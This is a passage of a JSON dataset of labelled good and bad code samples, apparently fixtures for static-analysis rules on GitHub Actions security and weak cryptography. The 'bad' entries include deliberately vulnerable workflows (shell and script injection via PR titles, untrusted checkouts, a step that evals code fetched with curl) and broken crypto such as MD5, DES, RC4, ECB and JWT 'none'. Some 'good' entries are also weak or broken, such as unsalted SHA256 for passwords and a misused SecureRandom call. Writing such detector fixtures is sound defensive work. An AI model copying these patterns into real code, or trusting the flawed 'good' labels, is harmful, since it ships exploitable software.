    "code": "import docker\nclient = docker.from_env()\n\ndef ok1():\n    # ok: docker-arbitrary-container-run\n    client.containers.run(\"alpine\", 'echo hello world')\n\ndef ok2():\n    # ok: docker-arbitrary-container-run\n    client.containers.create(\"alpine\", 'echo hello world')",
    "language": "python",
    "description": "Python Docker SDK - hardcoded container image"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "jobs:\n  docker-build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n\n      - name: Check PR title\n        # ruleid: run-shell-injection\n        run: |\n          title=\"${{ github.event.pull_request.title }}\"\n          if [[ $title =~ ^octocat ]]; then\n          echo \"PR title starts with 'octocat'\"\n          exit 0\n          else\n          echo \"PR title did not start with 'octocat'\"\n          exit 1\n          fi",
    "language": "yaml",
    "description": "vulnerable to script injection via PR title"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "on:\n  workflow_dispatch:\n    inputs:\n      message_to_print:\n        type: string\n        required: false\n\njobs:\n  docker-build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Print a message\n        # ruleid: run-shell-injection\n        run: |\n          echo \"${{github.event.inputs.message_to_print}}\"",
    "language": "yaml",
    "description": "vulnerable to injection via workflow inputs"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "jobs:\n  docker-build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Show issue title\n        # ruleid: run-shell-injection\n        run: |\n          echo \"${{ github.event.issue.title }}\"",
    "language": "yaml",
    "description": "vulnerable to injection via issue title"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "jobs:\n  docker-build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Show author email\n        # ruleid: run-shell-injection\n        run: |\n          echo \"${{ github.event.commits.fix-bug.author.email }}\"",
    "language": "yaml",
    "description": "vulnerable to injection via commit author email"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "good",
    "code": "jobs:\n  docker-build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Push commit hash if PR\n        if: github.event_name == 'pull_request' && github.event.pull_request.head.repo.full_name == github.repository\n        # ok: run-shell-injection\n        run: |\n          tag=returntocorp/semgrep:${{ github.sha }}\n          docker build -t \"$tag\" .\n          docker push \"$tag\"",
    "language": "yaml",
    "description": "safe use of GitHub context"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "good",
    "code": "jobs:\n  docker-build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: benign\n        # ok: run-shell-injection\n        run: |\n          AUTH_HEADER=\"Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}\";\n          HEADER=\"Accept: application/vnd.github.v3+json\";",
    "language": "yaml",
    "description": "using secrets safely"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "good",
    "code": "jobs:\n  docker-build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Download and Extract Artifacts\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n        # ok: run-shell-injection\n        run: |\n          mkdir -p artifacts && cd artifacts\n          artifacts_url=${{ github.event.workflow_run.artifacts_url }}\n          gh api \"$artifacts_url\" -q '.artifacts[] | [.name, .archive_download_url] | @tsv' | while read artifact\n          do\n            IFS=$'\\t' read name url <<< \"$artifact\"\n            gh api $url > \"$name.zip\"\n            unzip -d \"$name\" \"$name.zip\"\n          done",
    "language": "yaml",
    "description": "using workflow_run artifacts_url safely"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "jobs:\n  script-run:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Checkout\n        uses: actions/checkout@v3\n\n      - name: Run script 1\n        uses: actions/github-script@v6\n        if: steps.report-diff.outputs.passed == 'true'\n        with:\n          # ruleid: github-script-injection\n          script: |\n            const fs = require('fs');\n            const body = fs.readFileSync('/tmp/file.txt', {encoding: 'utf8'});\n\n            await github.rest.issues.createComment({\n              issue_number: context.issue.number,\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              body: '${{ github.event.pull_request.title }}' + body\n            })\n\n            return true;",
    "language": "yaml",
    "description": "vulnerable to injection via PR title in github-script"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "jobs:\n  script-run:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Run script 2\n        uses: actions/github-script@latest\n        with:\n          # ruleid: github-script-injection\n          script: |\n            const fs = require('fs');\n            const body = fs.readFileSync('/tmp/${{ github.event.issue.title }}.txt', {encoding: 'utf8'});\n\n            await github.rest.issues.createComment({\n              issue_number: context.issue.number,\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              body: 'Thanks for reporting!'\n            })\n\n            return true;",
    "language": "yaml",
    "description": "vulnerable to injection via issue title in github-script"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "good",
    "code": "jobs:\n  script-run:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Ok script 1\n        uses: not-github/custom-action@latest\n        with:\n          # ok: github-script-injection\n          script: |\n            return ${{ github.event.issue.title }};",
    "language": "yaml",
    "description": "non-github-script action is safe"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "good",
    "code": "jobs:\n  script-run:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Ok script 2\n        uses: actions/github-script@latest\n        with:\n          # ok: github-script-injection\n          script: |\n            console.log('${{ github.event.workflow_run.artifacts_url }}');\n\n            await github.rest.issues.createComment({\n              issue_number: context.issue.number,\n              owner: context.repo.owner,\n              repo: context.repo.repo,\n              body: 'Thanks for reporting!'\n            })\n\n            return true;",
    "language": "yaml",
    "description": "using safe github context like artifacts_url"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "# cf. https://securitylab.github.com/research/github-actions-preventing-pwn-requests/\n# INSECURE. Provided as an example only.\non:\n  pull_request_target:\n  pull_request:\n\njobs:\n  build:\n    name: Build and test\n    runs-on: ubuntu-latest\n    steps:\n      # ruleid: pull-request-target-code-checkout\n      - uses: actions/checkout@v2\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n\n      - uses: actions/setup-node@v1\n      - run: |\n          npm install\n          npm build\n\n      - uses: completely/fakeaction@v2\n        with:\n          arg1: ${{ secrets.supersecret }}",
    "language": "yaml",
    "description": "checking out PR code with pull_request_target"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "on:\n  pull_request_target:\n  pull_request:\n\njobs:\n  # cf. https://github.com/justinsteven/advisories/blob/master/2021_github_actions_checkspelling_token_leak_via_advice_symlink.md\n  spelling:\n    name: Spell checking\n    runs-on: ubuntu-latest\n    steps:\n      # ruleid: pull-request-target-code-checkout\n      - name: checkout-merge\n        if: contains(github.event_name, 'pull_request')\n        uses: actions/checkout@v2\n        with:\n          ref: refs/pull/${{github.event.pull_request.number}}/merge",
    "language": "yaml",
    "description": "using merge ref with pull_request_target"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "good",
    "code": "on:\n  pull_request_target:\n  pull_request:\n\njobs:\n  this-is-safe-because-no-checkout:\n    name: Echo\n    runs-on: ubuntu-latest\n    steps:\n      # ok: pull-request-target-code-checkout\n      - name: echo\n        run: |\n          echo \"Hello, world\"",
    "language": "yaml",
    "description": "no checkout of PR code"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "on:\n  workflow_run:\n    workflows: [\"smth-else\"]\n    types:\n    - completed\n  pull_request:\n\njobs:\n  build:\n    name: Build and test\n    runs-on: ubuntu-latest\n    steps:\n      # ruleid: workflow-run-target-code-checkout\n      - uses: actions/checkout@v2\n        with:\n          ref: ${{ github.event.workflow_run.head.sha }}\n\n      - uses: actions/setup-node@v1\n      - run: |\n          npm install\n          npm build\n\n      - uses: completely/fakeaction@v2\n        with:\n          arg1: ${{ secrets.supersecret }}",
    "language": "yaml",
    "description": "checking out PR code with workflow_run"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "on:\n  workflow_run:\n    workflows: [\"smth-else\"]\n    types:\n    - completed\n  pull_request:\n\njobs:\n  spelling:\n    name: Spell checking\n    runs-on: ubuntu-latest\n    steps:\n      # ruleid: workflow-run-target-code-checkout\n      - name: checkout-merge\n        if: contains(github.event_name, 'pull_request')\n        uses: actions/checkout@v2\n        with:\n          ref: refs/pull/${{github.event.workflow_run.number}}/merge",
    "language": "yaml",
    "description": "using merge ref with workflow_run"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "good",
    "code": "on:\n  workflow_run:\n    workflows: [\"smth-else\"]\n    types:\n    - completed\n  pull_request:\n\njobs:\n  this-is-safe-because-no-checkout:\n    name: Echo\n    runs-on: ubuntu-latest\n    steps:\n      # ok: workflow-run-target-code-checkout\n      - name: echo\n        run: |\n          echo \"Hello, world\"",
    "language": "yaml",
    "description": "no checkout of PR code"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "name: Build and deploy Semgrep scanner lambda\n\non:\n  workflow_dispatch:\n  push:\n    branches: develop\n\njobs:\n  docker-build:\n    runs-on: ubuntu-latest\n    env:\n      workdir: lambdas/run-semgrep\n    steps:\n      - uses: actions/checkout@v2\n      - name:\n          blah\n          # ruleid: curl-eval\n        run: |\n          CONTENTS=$(curl https://blah.com)\n          eval $CONTENTS",
    "language": "yaml",
    "description": "eval'ing data from curl"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "good",
    "code": "name: Build and deploy Semgrep scanner lambda\n\non:\n  workflow_dispatch:\n  push:\n    branches: develop\n\njobs:\n  docker-build:\n    runs-on: ubuntu-latest\n    env:\n      workdir: lambdas/run-semgrep\n    steps:\n      - uses: actions/checkout@v2\n      - name: Build Docker image\n        working-directory:\n          ${{ env.workdir }}/src\n          # ok: curl-eval\n        run: docker build -t semgrep-scanner:latest .",
    "language": "yaml",
    "description": "safe docker build without eval"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "on: pull_request\n\nname: command-processing-test\njobs:\n  dangerous-job:\n    name: example\n    runs-on: ubuntu-latest\n    steps:\n      - name: dont-do-this\n        env:\n          # ruleid: allowed-unsecure-commands\n          ACTIONS_ALLOW_UNSECURE_COMMANDS: true\n        run: |\n          echo \"don't do this\"",
    "language": "yaml",
    "description": "enabling unsecure commands in step env"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "on: pull_request\n\nname: command-processing-test\njobs:\n  another-dangerous-job:\n    name: example2\n    runs-on: ubuntu-latest\n    env:\n      # ruleid: allowed-unsecure-commands\n      ACTIONS_ALLOW_UNSECURE_COMMANDS: true\n    steps:\n      - name: or-this\n        run: |\n          echo \"seriously, dont\"",
    "language": "yaml",
    "description": "enabling unsecure commands in job env"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "good",
    "code": "on: pull_request\n\nname: command-processing-test\njobs:\n  this-is-ok:\n    name: example3\n    runs-on: ubuntu-latest\n    env: PREFIX = \"~~^_^~~\"\n    run: |\n      echo \"$PREFIX hello\"",
    "language": "yaml",
    "description": "no unsecure commands"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "on:\n  pull_request_target:\n  pull_request:\n\njobs:\n  build:\n    name: Build and test\n    runs-on: ubuntu-latest\n    steps:\n      # ruleid: third-party-action-not-pinned-to-commit-sha\n      - uses: fakerepo/comment-on-pr@v1\n        with:\n          message: |\n            Thank you!\n\n      # ruleid: third-party-action-not-pinned-to-commit-sha\n      - uses: fakerepo/comment-on-pr\n        with:\n          message: |\n            Thank you!",
    "language": "yaml",
    "description": "using tag or branch reference"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "jobs:\n  build:\n    name: Build and test\n    runs-on: ubuntu-latest\n    steps:\n      # ruleid: third-party-action-not-pinned-to-commit-sha\n      - uses: completely/fakeaction@5fd3084\n        with:\n          arg2: ${{ secrets.supersecret2 }}",
    "language": "yaml",
    "description": "using short SHA"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "jobs:\n  build:\n    name: Build and test\n    runs-on: ubuntu-latest\n    steps:\n      # ruleid: third-party-action-not-pinned-to-commit-sha\n      - uses: docker://gcr.io/cloud-builders/gradle\n\n      # ruleid: third-party-action-not-pinned-to-commit-sha\n      - uses: docker://alpine:3.8",
    "language": "yaml",
    "description": "unpinned Docker action"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "good",
    "code": "jobs:\n  build:\n    name: Build and test\n    runs-on: ubuntu-latest\n    steps:\n      # ok: third-party-action-not-pinned-to-commit-sha\n      - uses: completely/fakeaction@5fd3084fc36e372ff1fff382a39b10d03659f355\n        with:\n          arg2: ${{ secrets.supersecret2 }}",
    "language": "yaml",
    "description": "pinned to full commit SHA"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "good",
    "code": "jobs:\n  build:\n    name: Build and test\n    runs-on: ubuntu-latest\n    steps:\n      # ok: third-party-action-not-pinned-to-commit-sha\n      - uses: docker://alpine@sha256:402d21757a03a114d273bbe372fa4b9eca567e8b6c332fa7ebf982b902207242",
    "language": "yaml",
    "description": "Docker action with pinned digest"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "good",
    "code": "jobs:\n  build:\n    name: Build and test\n    runs-on: ubuntu-latest\n    steps:\n      # ok: third-party-action-not-pinned-to-commit-sha\n      - uses: actions/checkout@v2\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}\n\n      # ok: third-party-action-not-pinned-to-commit-sha\n      - uses: actions/setup-node@master\n\n      # ok: third-party-action-not-pinned-to-commit-sha\n      - name: Upload SARIF file for GitHub Advanced Security Dashboard\n        uses: github/codeql-action/upload-sarif@v2\n        with:\n          sarif_file: semgrep.sarif\n        if: always()",
    "language": "yaml",
    "description": "GitHub-owned actions don't need pinning"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "good",
    "code": "jobs:\n  build:\n    name: Build and test\n    runs-on: ubuntu-latest\n    steps:\n      # ok: third-party-action-not-pinned-to-commit-sha\n      - uses: ./.github/actions/do-a-local-action\n        with:\n          arg1: ${{ secrets.supersecret1 }}\n\n  build2:\n    name: Build and test using a local workflow\n    # ok: third-party-action-not-pinned-to-commit-sha\n    uses: ./.github/workflows/use_a_local_workflow.yml@master\n    secrets: inherit\n    with:\n      examplearg: true",
    "language": "yaml",
    "description": "local actions don't need pinning"
  },
  {
    "ruleId": "",
    "ruleTitle": "Secure GitHub Actions",
    "type": "bad",
    "code": "name: Test Workflow\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  test-job:\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v2\n\n      - name: Setup Python\n        uses: actions/setup-python@v2\n        with:\n          python-version: '3.8'\n\n      - name: Run script to generate token\n        run: |\n          TOKEN=$(openssl rand -hex 16)\n          # ruleid: unsafe-add-mask-workflow-command\n          echo \"::add-mask::$TOKEN\"\n          echo \"TOKEN=$TOKEN\" >> $GITHUB_ENV\n\n      - name: Use the token\n        run: |\n          echo \"Using the token in the next step\"\n          curl -H \"Authorization: Bearer $TOKEN\" https://api.example.com\n\n      - name: Print GitHub context\n        run: |\n          echo \"GitHub context:\"\n          echo \"${{ toJSON(github) }}\"\n          # ruleid: unsafe-add-mask-workflow-command\n          echo \"::add-mask::${{ secrets.GITHUB_TOKEN }}\"",
    "language": "yaml",
    "description": "using add-mask which can be bypassed"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import hashlib\n\n# Using MD5 for hashing\nhashlib.md5(1)\nhashlib.md5(1).hexdigest()\nabc = str.replace(hashlib.md5(\"1\"), \"###\")\nprint(hashlib.md5(\"1\"))\nfoo = hashlib.md5(data, usedforsecurity=True)",
    "language": "python",
    "description": "Python - MD5 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import hashlib\n\n# Using SHA1 for hashing\nhashlib.sha1(1)",
    "language": "python",
    "description": "Python - SHA1 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "from cryptography.hazmat.primitives import hashes\n\nhashes.SHA1()",
    "language": "python",
    "description": "Python - SHA1 with cryptography library"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "import hashlib\n\n# Using secure hash algorithm\nhashlib.sha256(1)\n\n# With cryptography library\nfrom cryptography.hazmat.primitives import hashes\nhashes.SHA256()\nhashes.SHA3_256()",
    "language": "python",
    "description": "Python - SHA256 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "from Crypto.Cipher import DES as pycrypto_des\nfrom Cryptodome.Cipher import DES as pycryptodomex_des\n\nkey = b'-8B key-'\nplaintext = b'We are no longer the knights who say ni!'\nnonce = Random.new().read(pycrypto_des.block_size/2)\nctr = Counter.new(pycrypto_des.block_size*8/2, prefix=nonce)\ncipher = pycrypto_des.new(key, pycrypto_des.MODE_CTR, counter=ctr)\ncipher = pycryptodomex_des.new(key, pycryptodomex_des.MODE_CTR, counter=ctr)",
    "language": "python",
    "description": "Python - DES cipher"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "from Crypto.Cipher import ARC4 as pycrypto_arc4\nfrom Cryptodome.Cipher import ARC4 as pycryptodomex_arc4\nfrom cryptography.hazmat.primitives.ciphers import algorithms\n\nkey = b'Very long and confidential key'\ntempkey = SHA.new(key+nonce).digest()\ncipher = pycrypto_arc4.new(tempkey)\ncipher = pycryptodomex_arc4.new(tempkey)\n\n# With cryptography library\ncipher = Cipher(algorithms.ARC4(key), mode=None, backend=default_backend())",
    "language": "python",
    "description": "Python - RC4/ARC4 cipher"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "from Crypto.Cipher import AES\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n\nkey = b'Sixteen byte key'\ncipher = AES.new(key, AES.MODE_EAX, nonce=nonce)\n\n# With cryptography library\ncipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())",
    "language": "python",
    "description": "Python - AES cipher"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "from cryptography.hazmat.primitives.ciphers.modes import ECB\n\nmode = ECB(iv)",
    "language": "python",
    "description": "Python - ECB mode"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "from cryptography.hazmat.primitives.ciphers.modes import CBC\n\nmode = CBC(iv)",
    "language": "python",
    "description": "Python - CBC mode"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "from cryptography.hazmat.primitives.asymmetric import rsa\n\nrsa.generate_private_key(public_exponent=65537,\n                         key_size=1024,\n                         backend=backends.default_backend())",
    "language": "python",
    "description": "Python - weak RSA key size"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "from cryptography.hazmat.primitives.asymmetric import rsa\n\nrsa.generate_private_key(public_exponent=65537,\n                         key_size=2048,\n                         backend=backends.default_backend())",
    "language": "python",
    "description": "Python - strong RSA key size"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import jwt\n\nencoded = jwt.encode({'some': 'payload'}, None, algorithm='none')\njwt.decode(encoded, None, algorithms=['none'])",
    "language": "python",
    "description": "Python - JWT none algorithm"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "import jwt\n\nencoded = jwt.encode({'some': 'payload'}, secret_key, algorithm='HS256')",
    "language": "python",
    "description": "Python - JWT with proper algorithm"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import java.security.MessageDigest;\n\npublic byte[] bad1(String password) {\n    MessageDigest md5Digest = MessageDigest.getInstance(\"MD5\");\n    md5Digest.update(password.getBytes());\n    byte[] hashValue = md5Digest.digest();\n    return hashValue;\n}\n\njava.security.MessageDigest md = java.security.MessageDigest.getInstance(\"MD5\");",
    "language": "java",
    "description": "Java - MD5 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import java.security.MessageDigest;\nimport org.apache.commons.codec.digest.DigestUtils;\n\nMessageDigest sha1Digest = MessageDigest.getInstance(\"SHA-1\");\nsha1Digest.update(password.getBytes());\n\nbyte[] hashValue = DigestUtils.getSha1Digest().digest(password.getBytes());\n\njava.security.MessageDigest md = java.security.MessageDigest.getInstance(\"SHA1\", \"SUN\");",
    "language": "java",
    "description": "Java - SHA1 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "import java.security.MessageDigest;\n\nMessageDigest sha512Digest = MessageDigest.getInstance(\"SHA-512\");\nsha512Digest.update(password.getBytes());\nbyte[] hashValue = sha512Digest.digest();",
    "language": "java",
    "description": "Java - SHA-512 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "Cipher c = Cipher.getInstance(\"DES/ECB/PKCS5Padding\");\nc.init(Cipher.ENCRYPT_MODE, k, iv);\n\nCipher c = Cipher.getInstance(\"DES\");",
    "language": "java",
    "description": "Java - DES cipher"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "Cipher.getInstance(\"RC4\");\nuseCipher(Cipher.getInstance(\"RC4\"));",
    "language": "java",
    "description": "Java - RC4 cipher"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\nc.init(Cipher.ENCRYPT_MODE, k, iv);\n\nCipher.getInstance(\"AES/CBC/PKCS7PADDING\");",
    "language": "java",
    "description": "Java - AES with GCM"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "Cipher c = Cipher.getInstance(\"AES/ECB/NoPadding\");\nc.init(Cipher.ENCRYPT_MODE, k, iv);\nbyte[] cipherText = c.doFinal(plainText);",
    "language": "java",
    "description": "Java - ECB mode"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\nc.init(Cipher.ENCRYPT_MODE, k, iv);\nbyte[] cipherText = c.doFinal(plainText);",
    "language": "java",
    "description": "Java - GCM mode"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import java.security.KeyPairGenerator;\n\nKeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\nkeyGen.initialize(512);",
    "language": "java",
    "description": "Java - weak RSA key size"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "import java.security.KeyPairGenerator;\n\nKeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\nkeyGen.initialize(2048);",
    "language": "java",
    "description": "Java - strong RSA key size"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "float rand = new java.util.Random().nextFloat();\nnew java.util.Random().nextInt();\ndouble value = java.lang.Math.random();",
    "language": "java",
    "description": "Java - weak random number generator"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "double value2 = java.security.SecureRandom();",
    "language": "java",
    "description": "Java - secure random"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "SSLContext ctx = SSLContext.getInstance(\"SSL\");\nSSLContext ctx = SSLContext.getInstance(\"TLS\");\nSSLContext ctx = SSLContext.getInstance(\"TLSv1\");\nSSLContext ctx = SSLContext.getInstance(\"SSLv3\");\nSSLContext ctx = SSLContext.getInstance(\"TLSv1.1\");",
    "language": "java",
    "description": "Java - weak SSL context"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "SSLContext ctx = SSLContext.getInstance(\"TLSv1.2\");\nSSLContext ctx = SSLContext.getInstance(\"TLSv1.3\");",
    "language": "java",
    "description": "Java - secure TLS version"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "// Using pseudoRandomBytes which is not cryptographically secure\ncrypto.pseudoRandomBytes",
    "language": "javascript",
    "description": "JavaScript - weak pseudo-random bytes"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "// Using cryptographically secure random bytes\ncrypto.randomBytes",
    "language": "javascript",
    "description": "JavaScript - secure random bytes"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "const crypto = require(\"crypto\");\n\nfunction ex1(user, pwtext) {\n    digest = crypto.createHash(\"md5\").update(pwtext).digest(\"hex\");\n    user.setPassword(digest);\n}",
    "language": "javascript",
    "description": "JavaScript - MD5 for password hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "const crypto = require(\"crypto\");\n\nfunction ok1(user, pwtext) {\n    digest = crypto.createHash(\"sha256\").update(pwtext).digest(\"hex\");\n    user.setPassword(digest);\n}",
    "language": "javascript",
    "description": "JavaScript - SHA256 for password hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "const jose = require(\"jose\");\nconst { JWK, JWT } = jose;\nconst token = JWT.verify('token-here', JWK.None);",
    "language": "javascript",
    "description": "JavaScript - JWT none algorithm"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "const jose = require(\"jose\");\nconst { JWK, JWT } = jose;\nconst token = JWT.verify('token-here', secretKey);",
    "language": "javascript",
    "description": "JavaScript - JWT with proper key"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import (\n    \"crypto/md5\"\n    \"fmt\"\n    \"io\"\n)\n\nfunc test_md5() {\n    h := md5.New()\n    if _, err := io.Copy(h, f); err != nil {\n        log.Fatal(err)\n    }\n    fmt.Printf(\"%x\", md5.Sum(nil))\n}",
    "language": "go",
    "description": "Go - MD5 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import (\n    \"crypto/sha1\"\n    \"fmt\"\n    \"io\"\n)\n\nfunc test_sha1() {\n    h := sha1.New()\n    if _, err := io.Copy(h, f); err != nil {\n        log.Fatal(err)\n    }\n    fmt.Printf(\"%x\", sha1.Sum(nil))\n}",
    "language": "go",
    "description": "Go - SHA1 hashing"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import \"crypto/des\"\n\nfunc test_des() {\n    ede2Key := []byte(\"example key 1234\")\n    var tripleDESKey []byte\n    tripleDESKey = append(tripleDESKey, ede2Key[:16]...)\n    tripleDESKey = append(tripleDESKey, ede2Key[:8]...)\n    _, err := des.NewTripleDESCipher(tripleDESKey)\n}",
    "language": "go",
    "description": "Go - DES cipher"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import \"crypto/rc4\"\n\nfunc test_rc4() {\n    key := []byte{1, 2, 3, 4, 5, 6, 7}\n    c, err := rc4.NewCipher(key)\n    dst := make([]byte, len(src))\n    c.XORKeyStream(dst, src)\n}",
    "language": "go",
    "description": "Go - RC4 cipher"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import (\n    \"crypto/rand\"\n    \"crypto/rsa\"\n)\n\npvk, err := rsa.GenerateKey(rand.Reader, 1024)",
    "language": "go",
    "description": "Go - weak RSA key size"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
    "code": "import (\n    \"crypto/rand\"\n    \"crypto/rsa\"\n)\n\npvk, err := rsa.GenerateKey(rand.Reader, 2048)",
    "language": "go",
    "description": "Go - strong RSA key size"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "bad",
    "code": "import mrand \"math/rand\"\nimport mrand \"math/rand/v2\"",
    "language": "go",
    "description": "Go - weak random number generator"
  },
  {
    "ruleId": "",
    "ruleTitle": "Avoid Insecure Cryptography",
    "type": "good",
